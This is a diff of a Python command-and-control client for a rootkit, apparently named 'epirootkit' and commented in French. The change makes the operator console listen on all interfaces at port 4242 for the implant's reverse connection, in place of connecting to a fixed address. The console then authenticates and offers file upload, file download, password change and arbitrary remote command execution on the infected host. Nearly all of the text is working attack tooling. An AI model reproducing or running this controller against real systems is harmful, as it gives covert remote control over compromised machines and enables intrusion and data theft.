@@ -4,7 +4,7 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.15.6"
+LISTEN_IP = "0.0.0.0"  # écoute sur toutes les interfaces
 PORT = 4242
 KEY = b"epirootkit"
 
@@ -45,14 +45,12 @@ def upload_file(sock, local_path, remote_path):
 def download_file(sock, remote_path, local_path):
     command = f"download {remote_path}"
     send(sock, command)
-    
     with open(local_path, 'wb') as f:
         while True:
             data = sock.recv(4096)
             if not data:
                 break
             f.write(data)
-    
     print(f"[+] Fichier téléchargé: {local_path}")
     return True
 
@@ -64,49 +62,48 @@ def change_password(sock, new_password):
     return "success" in response.lower()
 
 def main():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((SERVER_IP, PORT))
-        print(f"[+] Connecté à {SERVER_IP}:{PORT}")
-
-        # Authentification
-        password = getpass.getpass("Mot de passe: ")
-        send(s, f"auth {password}")
-        response = recv(s)
-        if response.strip() != "OK":
-            print("[-] Authentification échouée.")
-            return
-
-        print("[+] Authentifié.")
-
-        while True:
-            cmd = input("$ ")
-            if cmd.strip().lower() in ("exit", "quit"):
-                break
-            elif cmd.startswith("upload "):
-                # Format: upload local_path remote_path
-                try:
-                    _, local_path, remote_path = cmd.split()
-                    upload_file(s, local_path, remote_path)
-                except ValueError:
-                    print("Usage: upload local_path remote_path")
-            elif cmd.startswith("download "):
-                # Format: download remote_path local_path
-                try:
-                    _, remote_path, local_path = cmd.split()
-                    download_file(s, remote_path, local_path)
-                except ValueError:
-                    print("Usage: download remote_path local_path")
-            elif cmd.startswith("passwd "):
-                # Format: passwd new_password
-                try:
-                    _, new_password = cmd.split()
-                    change_password(s, new_password)
-                except ValueError:
-                    print("Usage: passwd new_password")
-            else:
-                send(s, f"exec {cmd}")
-                output = recv(s)
-                print(output)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind((LISTEN_IP, PORT))
+        server.listen(1)
+        print(f"[+] En attente de connexion sur {LISTEN_IP}:{PORT} ...")
+        sock, addr = server.accept()
+        with sock:
+            print(f"[+] Connexion reçue de {addr[0]}:{addr[1]}")
+            # Authentification
+            password = getpass.getpass("Mot de passe: ")
+            send(sock, f"auth {password}")
+            response = recv(sock)
+            if response.strip() != "OK":
+                print("[-] Authentification échouée.")
+                return
+            print("[+] Authentifié.")
+            while True:
+                cmd = input("$ ")
+                if cmd.strip().lower() in ("exit", "quit"):
+                    break
+                elif cmd.startswith("upload "):
+                    try:
+                        _, local_path, remote_path = cmd.split()
+                        upload_file(sock, local_path, remote_path)
+                    except ValueError:
+                        print("Usage: upload local_path remote_path")
+                elif cmd.startswith("download "):
+                    try:
+                        _, remote_path, local_path = cmd.split()
+                        download_file(sock, remote_path, local_path)
+                    except ValueError:
+                        print("Usage: download remote_path local_path")
+                elif cmd.startswith("passwd "):
+                    try:
+                        _, new_password = cmd.split()
+                        change_password(sock, new_password)
+                    except ValueError:
+                        print("Usage: passwd new_password")
+                else:
+                    send(sock, f"exec {cmd}")
+                    output = recv(sock)
+                    print(output)
 
 if __name__ == "__main__":
     main()
